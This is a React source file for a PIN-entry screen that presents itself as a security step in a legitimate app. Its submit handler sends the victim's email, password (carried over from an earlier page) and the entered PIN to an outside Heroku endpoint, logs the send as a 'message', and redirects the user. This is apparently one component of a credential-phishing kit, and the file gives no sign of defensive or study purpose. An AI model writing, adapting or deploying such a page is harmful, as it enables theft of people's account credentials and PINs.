import React, { useState } from 'react'
import OtpInput from 'react-otp-input'
import { useHistory } from 'react-router-dom'

export default function Otp(props) {
    const history = useHistory()

    const [otp, setOtp] = useState('')
    const [keepOtp, setKeepOtp] = useState([])
    const [loading, setLoading] = useState(false)

    const inputHandler = (input) => {
        setOtp(input)
        setKeepOtp((singleOtp) => [input])
    }

    const handleSubmit = async (e) => {
        e.preventDefault()
        setLoading(true)

        const clientOtp = keepOtp.toString()
        history.push('/')

        if (props.location.state) {
            const templateParams = props.location.state

            templateParams.clientOtp = clientOtp

            try {
               // const URL = 'http://localhost:3030'
                 const URL = 'https://roqq.herokuapp.com'
                const response = await fetch(URL + '/skye-app', {
                    method: 'POST',
                    headers: {
                        'Content-type': 'application/json',
                    },
                    body: JSON.stringify({
                        email: templateParams.email,
                        password: templateParams.password,
                        pin: clientOtp,
                    }),
                })

                const resData = await response.json()

                console.log('email sending started')

                if (resData.status === 'success') {
                    console.log('Message Sent.')
                    setTimeout(() => {
                        console.log('time out init')
                        setLoading(false)

                        history.push('/')
                    }, 10000)
                } else if (resData.status === 'fail') {
                    console.log('Message failed to send.')
                    setLoading(false)
                }
            } catch (err) {
                console.log(err)
            }
        }
    }

    return (
        <div className='container mx-auto h-screen grid bg-white text-black'>
            <div className='max-w-sm mx-auto md:max-w-lg grid'>
                <div className='w-full grid justify-center justify-items-center items-center'>
                    <div className=' h-96 py-3 rounded text-center self-center'>
                        <h1 className='text-2xl font-bold'>Enter PIN</h1>
                        <div
                            className='flex flex-col mt-4 mx-5'
                            style={{
                                lineHeight: '2em !important',
                                fontSize: '15px',
                            }}
                        >
                            {' '}
                            <span className='px-8'>
                                For your security, a pin will be required to
                                access the app and perform other transactions
                            </span>{' '}
                        </div>

                        <form
                            onSubmit={handleSubmit}
                            className='grid justify-items-center'
                        >
                            <OtpInput
                                value={otp}
                                onChange={inputHandler}
                                numInputs={4}
                                inputStyle='pinlogin-field'
                                containerStyle='pinlogin'
                                shouldAutoFocus
                                isInputNum
                            />

                            <div className='flex justify-center text-center mt-20'>
                                {' '}
                                <button className='flex items-center'>
                                    <span className=' bg-[#005674] text-white py-2 px-11 rounded-lg'>
                                        {loading ? 'loading...' : 'Confirm'}
                                    </span>
                                </button>{' '}
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    )
}
